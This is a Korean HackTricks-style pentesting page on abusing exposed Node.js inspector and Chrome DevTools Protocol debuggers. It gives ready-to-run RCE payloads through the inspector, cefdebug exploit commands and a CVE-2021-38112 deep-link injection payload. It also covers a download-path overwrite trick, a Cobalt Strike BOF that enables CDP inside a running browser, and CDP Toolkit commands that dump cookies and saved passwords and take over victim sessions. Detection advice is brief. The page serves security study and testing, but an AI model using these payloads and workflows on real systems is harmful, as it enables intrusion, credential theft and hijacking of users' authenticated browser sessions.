# Node inspector/CEF 디버거 악용

{{#include ../../banners/hacktricks-training.md}}

과거의 실제 사례로는 Multimaster walkthrough와 CVE-2019-1414 Visual Studio Code debugger attack이 있습니다. 모든 최신 Electron 또는 Chromium 대상에서 동일한 기능을 사용할 수 있다고 가정하지 말고, 버전에 따른 맥락으로 참고하세요.<sup>[[1]](#references)[[3]](#references)</sup>

## 기본 정보

[문서에서 발췌](https://nodejs.org/learn/getting-started/debugging): `--inspect` 스위치를 사용해 시작하면 Node.js 프로세스는 debugging client의 연결을 기다립니다. **기본적으로** 호스트와 포트 **`127.0.0.1:9229`**에서 연결을 기다립니다. 각 프로세스에는 **고유한** **UUID**도 할당됩니다.<sup>[[4]](#references)</sup>

연결하려면 Inspector client가 호스트 주소, 포트, UUID를 알고 지정해야 합니다. 전체 URL은 `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`와 같은 형식입니다.<sup>[[4]](#references)</sup>

> [!WARNING]
> **debugger는 Node.js 실행 환경에 대한 전체 권한을 가지므로**, 이 포트에 연결할 수 있는 악의적인 행위자는 Node.js 프로세스를 대신해 임의 코드를 실행할 수 있습니다(**잠재적인 권한 상승**).<sup>[[4]](#references)</sup>

Inspector를 시작하는 방법은 여러 가지입니다.<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

검사 중인 프로세스를 시작하면 다음과 같은 내용이 표시됩니다:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

**CEF**(**Chromium Embedded Framework**) 기반 프로세스는 `--remote-debugging-port=9222`로 debugger를 노출할 수 있습니다. 이는 Node.js inspector가 아니라 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)을 통해 브라우저를 노출하므로, Node.js `process` 기반 payload는 기본적으로 직접 적용할 수 없습니다.<sup>[[2]](#references)[[5]](#references)</sup>

디버깅 모드로 브라우저를 시작하면 다음과 비슷한 내용이 표시됩니다:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### CDP endpoint 열거 및 제어

HTTP discovery endpoint는 **browser** WebSocket과 개별 **target**(탭, worker, extension 등) WebSocket을 구분합니다. browser endpoint는 `/json/version`, target은 `/json/list`를 조회하세요. 반환된 `webSocketDebuggerUrl` 값은 CDP의 JSON-RPC와 유사한 메시지를 사용해 직접 제어할 수 있습니다.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

예를 들어 `websocat "$BROWSER_WS"`로 연결한 다음 `{"id":1,"method":"Target.getTargets"}` 또는 `{"id":2,"method":"Storage.getCookies"}`를 전송합니다. 페이지 target(`websocat "$PAGE_WS"`)에서는 `Runtime.evaluate`가 해당 renderer에서 실행되고, `Page.captureScreenshot`은 base64로 인코딩된 스크린샷을 반환합니다. `document.cookie`로는 `HttpOnly` 쿠키를 확인할 수 없지만, `Storage.getCookies`는 브라우저에 쿠키 저장소를 요청합니다.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### 브라우저, WebSocket 및 동일 출처 정책 <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

웹 브라우저에서 열린 웹사이트는 브라우저 보안 모델에 따라 WebSocket 및 HTTP 요청을 보낼 수 있습니다. **고유한 debugger session id를 얻으려면** **초기 HTTP 연결**이 필요합니다. **동일 출처 정책**은 웹사이트가 **이 HTTP 연결**을 만들지 못하게 **차단합니다**. [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**에** 대비한 추가 보안 조치로, Node.js는 연결의 **'Host' 헤더**가 **IP 주소** 또는 정확히 **`localhost`**를 지정하는지 확인합니다.<sup>[[4]](#references)</sup>

> [!TIP]
> 이러한 **보안 조치는 HTTP 요청만 보내 inspector를 악용해 코드를 실행하는 것을 방지합니다**(SSRF 취약점을 악용하면 가능할 수 있습니다).<sup>[[4]](#references)</sup>

### 실행 중인 프로세스에서 inspector 시작하기

실행 중인 nodejs 프로세스에 **SIGUSR1 시그널**을 보내면 기본 포트에서 **inspector를 시작**하게 할 수 있습니다. 단, 충분한 권한이 필요하므로 이를 통해 **프로세스 내부 정보에 대한 권한 있는 접근**을 얻을 수는 있지만, 직접적인 권한 상승으로 이어지지는 않습니다.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> 이는 컨테이너에서 유용합니다. 프로세스와 함께 **컨테이너도 종료되므로**, **프로세스를 종료하고 `--inspect` 옵션으로 새 프로세스를 시작하는 것**은 **선택지가 아니기 때문입니다**.<sup>[[6]](#references)</sup>

### inspector/debugger에 연결하기

**Chromium 기반 브라우저**에 연결하려면 Chrome 또는 Edge에서 각각 `chrome://inspect` 또는 `edge://inspect` URL에 접속할 수 있습니다. Configure 버튼을 클릭하여 **대상 호스트와 포트**가 올바르게 표시되는지 확인해야 합니다. 이미지는 Remote Code Execution (RCE) 예시를 보여줍니다:<sup>[[2]](#references)[[4]](#references)</sup>

![디버거에 접속할 URL이 표시됩니다. 예: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger에 연결하기: Chromium 기반 브라우저에 연결하려면...](<../../images/image (674).png>)

**명령줄**을 사용하면 다음과 같이 debugger/inspector에 연결할 수 있습니다:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

도구 [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)를 사용하면 로컬에서 실행 중인 **inspector를 찾고** 해당 inspector에 **코드를 주입**할 수 있습니다.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)을 통해 브라우저에 연결된 경우 **NodeJS RCE 익스플로잇은 작동하지 않습니다**(흥미로운 작업을 수행하려면 API를 확인해야 합니다).<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS 디버거/인스펙터에서의 RCE

> [!TIP]
> [**Electron의 XSS에서 RCE를 얻는 방법을 찾으러 오셨다면 이 페이지를 확인하세요.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Node **인스펙터**에 **연결**할 수 있을 때 **RCE**를 얻는 일반적인 방법으로는 다음과 같은 것을 사용할 수 있습니다(이 방법은 **Chrome DevTools Protocol에 연결했을 때는 작동하지 않는 것으로 보입니다**).<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol 페이로드

API는 여기서 확인할 수 있습니다: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
이 섹션에서는 사람들이 이 프로토콜을 악용하는 데 사용한 흥미로운 사례만 나열하겠습니다.

### Chrome 136+ 기본 프로필 제한

**Chrome 136**부터 Chrome은 `--remote-debugging-port` 및 `--remote-debugging-pipe`가 **기본 Chrome 데이터 디렉터리**를 대상으로 할 경우 이를 무시합니다. 이 스위치를 사용하려면 별도의 암호화 키와 격리된 브라우저 상태를 사용하는 표준이 아닌 `--user-data-dir`을 함께 지정해야 합니다. 따라서 단순한 플래그 기반 기법으로 사용자의 일반 인증 프로필이 노출되는 것을 막을 수 있습니다. 이 Chrome 관련 제한이 확인 없이 이전 Chrome 빌드, Chrome for Testing, Electron/CEF 애플리케이션 또는 다른 Chromium 파생 버전에도 적용된다고 가정해서는 안 됩니다.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

따라서 `--remote-debugging-port`만 사용해 실행된 현재 Chrome 프로세스를 확인했다고 해서 CDP가 활성화되었다고 단정할 수는 없습니다. 리스너와 `/json/version`을 확인하고, 실제로 어떤 프로필이 이를 뒷받침하는지 파악하세요.<sup>[[14]](#references)</sup>

### 딥 링크를 통한 매개변수 주입

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)에서 Rhino Security는 CEF 기반 애플리케이션이 시스템에 사용자 지정 URI(workspaces://index.html)를 **등록**하고, 전체 URI를 전달받은 뒤 해당 URI로 일부 구성이 만들어지는 CEF 기반 애플리케이션을 **실행**한다는 사실을 발견했습니다.<sup>[[8]](#references)</sup>

URI 매개변수가 URL 디코딩된 후 CEF 기반 애플리케이션을 실행하는 데 사용되어, 사용자가 명령줄에 **`--gpu-launcher`** 플래그를 **주입**하고 임의의 작업을 실행할 수 있다는 사실이 밝혀졌습니다.<sup>[[8]](#references)</sup>

따라서 다음과 같은 페이로드를 사용할 수 있습니다:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

calc.exe를 실행합니다.<sup>[[8]](#references)</sup>

### 파일 덮어쓰기

**다운로드한 파일이 저장될 폴더**를 변경하고, 파일을 다운로드해 자주 사용되는 애플리케이션의 **소스 코드**를 **악성 코드**로 **덮어씁니다**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE 및 exfiltration

STAR Labs는 노출된 WebDriver/CDP 서비스가 임의 파일 읽기와 RCE를 가능하게 할 수 있으며, 일부 구성에서는 DNS rebinding으로 exploit chain을 완성할 수 있음을 보여 주었습니다.<sup>[[9]](#references)</sup>

ChromeDriver의 WebDriver 서비스는 Chrome DevTools/CDP와 별개입니다. [`goog:chromeOptions.binary` capability](https://developer.chrome.com/docs/chromedriver/capabilities)는 새 세션에서 실행할 브라우저 실행 파일을 지정합니다. 권한이 낮은 호출자가 root로 실행 중인 ChromeDriver 서비스에 접근할 수 있고 호출자가 제어하는 실행 파일 경로로 세션을 제출한다면, 실행 과정에서 서비스의 권한 경계를 넘을 수 있습니다. 비어 있는 `/sessions` 응답만으로 새 세션 생성 가능 여부를 단정할 수는 없습니다. 해당 경로를 이용할 수 있다고 결론 내리기 전에 프로세스 소유자, 실제 리스너 접근 가능성, 세션 인증, 실행 파일 접근 권한, 격리 여부를 확인하세요. 프로세스 이름이나 일반적으로 사용하는 포트만으로는 충분하지 않습니다. [Google의 보안 지침](https://developer.chrome.com/docs/chromedriver/security-considerations)은 ChromeDriver를 권한이 없는 계정으로 실행하라고 안내합니다. 수동 열거 과정에서 WebDriver 세션을 생성해서는 안 됩니다.

브라우저 자동화와 Chromium 보안 관련 과거 사례는 Counter WebDriver write-up과 Project Zero issues 773, 1742, 1944를 참조하세요.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### 실행 중인 Chromium 프로세스에서 CDP 활성화하기

Chrome의 기본 프로필 제한은 명령줄을 통한 활성화 경로만 차단합니다. 브라우저 프로세스를 조작할 수 있는 충분한 동일 사용자 접근 권한이 있다면, 기존의 [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler)와 Cobalt Strike [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF)는 이미 실행 중인 `chrome.exe` 또는 `msedge.exe` 내부에서 Chromium의 비공개 `content::DevToolsAgentHost::StartRemoteDebuggingServer`를 호출합니다. 따라서 엔드포인트는 실제 프로필에 속하며, 해당 프로필의 탭, 확장 프로그램, 쿠키 및 인증된 상태를 그대로 유지합니다.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

일반적인 x64 Chrome/Edge 프로세스에서 BOF는 브라우저 창과 로드된 `chrome.dll`/`msedge.dll`을 찾고, 마스크된 시그니처를 사용해 원격 PE를 검색한 다음, 스텁과 컨텍스트 블록을 할당하고 창 프로시저를 일시적으로 대체한 뒤 브라우저 **UI thread**에서 마지막 호출을 실행합니다. 관련 런타임 입력은 `StartRemoteDebuggingServer`, Chromium의 `operator new`, `TCPServerSocketFactory::CreateForHttpServer`, 그리고 팩토리 vtable입니다. 필수 시그니처 중 하나라도 고유한 일치 항목을 찾지 못하면 실행이 중단됩니다.<sup>[[15]](#references)[[16]](#references)</sup>

BOF는 브라우저 모드와 선택적 포트를 인수로 받습니다. 이후 헬퍼 스크립트로 엔드포인트를 확인하고 쿠키를 수집할 수 있습니다. `chrome-iso`는 Chrome의 Windows Process Isolation 경계를 위한 별도 경로입니다.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

`chrome-iso` 경로는 격리된 프로세스에 대해 쿼리 권한만 있는 핸들만 사용합니다. 설치된 `chrome.dll` 중 PE 이미지 크기가 실행 중인 프로세스와 일치하는 파일을 식별하고, 해당 로컬 이미지에서 심볼을 확인한 다음 Chromium의 `WindowImpl` 디스패치와 동기식 `WM_COPYDATA`, 기존 이미지의 User32 hook을 사용해 UI 스레드에 접근합니다.<sup>[[16]](#references)</sup>

> [!WARNING]
> 이는 **침해 후 브라우저 프로세스 조작** 기법이지, 인증되지 않은 네트워크 우회 기법이 아닙니다. 관련 C++ 심볼이 export되지 않고 브라우저 업데이트 후 변경될 수 있으므로 빌드에 따라 달라집니다.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### 브라우저 업데이트 후 시그니처 갱신

대상에 설치된 버전과 정확히 일치하는 `chrome.dll` 또는 `msedge.dll` 및 해당 파일과 일치하는 PDB를 사용합니다. Windows SDK의 `symchk.exe`로 심볼을 다운로드합니다. 그런 다음 저장소 스크립트를 사용해 `StartRemoteDebuggingServer`를 찾고, allocator/socket-factory 입력값을 도출하거나 BOF에 포함된 모든 시그니처를 검증합니다.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

zero-hit 또는 multi-hit 결과를 임의의 주소로 대체해서는 안 됩니다. 알려진 `operator new` 또는 `CreateForHttpServer` 패턴이 새 마스크를 만들기에는 너무 많이 바뀌었다면, `pe_signature_finder.py`와 PDB를 사용해 해당 심볼을 조사하고 대상 모듈에서 유일한 바이트 시퀀스를 도출하세요.<sup>[[16]](#references)[[18]](#references)</sup>

#### CDP Toolkit을 사용한 인증된 브라우저 추출

이 기법은 App-Bound Encryption (ABE)을 오프라인에서 복호화하거나 디바이스 바인딩을 제거하지 않습니다. 대신 정상 브라우저를 **복호화 오라클이자 인증된 상호작용 프록시**로 취급합니다. `Storage.getCookies`는 실행 중인 브라우저에 쿠키 저장소를 요청하고, 탐색 및 스크린캐스트 워크플로는 요청, 저장소, 엔터프라이즈 인증, 디바이스 바인딩 동작을 피해자의 기존 브라우저 내부에서 유지합니다.<sup>[[17]](#references)[[18]](#references)</sup>

루프백 CDP 리스너를 operator의 pivot을 통해 라우팅한 후, [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit)을 사용해 일반적인 아티팩트를 열거하고 수집할 수 있습니다.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump`, `tabs screenshot`은 대부분 `/json/version`, target 목록, `Storage.getCookies`, `Page.captureScreenshot`을 감싸는 wrapper입니다. 반면 History, bookmarks, extensions, password metadata에는 임시 `chrome://`/`edge://` WebUI target이 필요합니다. toolkit은 화면이 렌더링될 때까지 기다린 다음, 모델이나 DOM을 검사하고 결과를 수집한 뒤 target을 닫습니다.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump`는 한 단계 더 나아갑니다. 실제 저장된 로그인 origin을 열고, credential 필드에 포커스를 맞춘 뒤 CDP input event를 사용해 기본 autofill 제안을 선택하고, 채워진 값을 읽습니다. origin/port/path는 저장된 password realm과 최대한 일치해야 합니다. 제안 팝업은 기본 browser UI이므로 visible mode가 안정적인 기본값입니다.<sup>[[17]](#references)[[18]](#references)</sup>

실시간 상호작용을 위해 `browser-takeover screencast`는 프레임을 스트리밍하고 실제 target에 입력을 전송합니다(background 또는 off-screen mode 포함). 반면 `browser-takeover proxy`는 로컬에서 HTTP와 HTTPS `CONNECT`를 수신하고, 숨겨진 Chrome target을 통해 upstream request를 수행합니다. 숨겨진 target을 사용할 수 없으면 background tab으로 대체합니다. 이 방식은 victim의 network/authentication context를 유지하지만, 반환된 content를 operator의 browser가 렌더링하므로 복잡한 client-side application에서는 충실도가 떨어집니다.<sup>[[17]](#references)[[18]](#references)</sup>

탐지 시에는 `--remote-debugging-*` command-line telemetry에만 의존하지 마세요. browser process에 대한 비정상적인 handle 및 memory operation(`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, thread creation), DLL injection, 그리고 Chrome/Edge가 소유한 예기치 않은 loopback listening socket도 함께 연관 분석하세요.<sup>[[15]](#references)</sup>

### Post-Exploitation

실제 환경에서 Chromium 기반 browser를 사용하는 user PC를 **compromising한 후**, 과거에는 debugging을 활성화하고 loopback port를 forward하여 browser를 다시 실행하는 기법이 있었습니다. 선택한 profile을 여전히 허용하는 제품/build에서는 victim의 browsing state가 노출될 수 있지만, Chrome 136+에서는 기본 data directory를 대상으로 이 방법이 적용되지 않습니다.<sup>[[7]](#references)[[14]](#references)</sup>

원래의 재실행 command는 구버전/특정 버전 대상용으로 아래에 보존되어 있습니다. 두 번째 command는 현재 Chrome에서 지원되는 형식이지만, victim의 일반적인 인증 상태를 다시 여는 대신 격리된 profile을 생성합니다.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

macOS 전용 Chromium 재실행, 확장 프로그램 및 CDP tradecraft는 [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md)을 참조하세요.



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium 디버거 검사 및 악용 도구](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools 디버거를 통한 Visual Studio Code 원격 코드 실행](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js 디버깅 가이드 - 시작하기](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Chrome 디버깅 기능을 악용해 원격으로 브라우징 세션 관찰 및 제어하기](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces 원격 코드 실행](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - DNS Rebinding 및 CDP를 통한 WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Bot에서 RCE까지](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium 버그 트래커)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium 버그 트래커)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium 버그 트래커)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [보안 강화를 위한 원격 디버깅 스위치 변경 - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [실행 중인 Edge 브라우저에 CDP 주입하기: 런타임 브라우저 계측 심층 분석](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Cookie Monster의 귀환](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
